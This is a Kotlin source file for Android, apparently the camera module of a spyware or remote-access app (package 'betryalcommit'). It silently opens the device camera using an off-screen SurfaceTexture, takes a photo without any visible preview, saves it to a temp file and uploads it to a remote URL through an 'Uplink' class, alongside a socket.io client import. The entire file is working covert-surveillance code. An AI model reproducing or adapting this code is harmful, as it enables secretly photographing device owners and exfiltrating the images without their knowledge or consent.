package com.example.betryalcommit

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import io.socket.client.Socket
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.LinkedBlockingQueue
import kotlin.random.Random

class CameraCaptureHelper {
    fun capture(url:String, cameraId: Int) {
        val file = File.createTempFile("Camera_back-  ${Random.nextInt()}  -  ", ".png")
        val holder = SurfaceTexture(0)
        val camera = Camera.open(cameraId)
        try{
            camera.setPreviewTexture(holder)
            camera.startPreview()
            camera.takePicture(
                null,
                null,
            ) { p0, p1 ->
                try {
                    FileOutputStream(file).use { outputStream ->
                        outputStream.write(p0)
                    }
                    p1.release()
                    Uplink(url).push(file)

                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    camera.release()
                }
            }
        }catch (e:Exception){
            Log.e("error",e.toString())
        }
    }



}
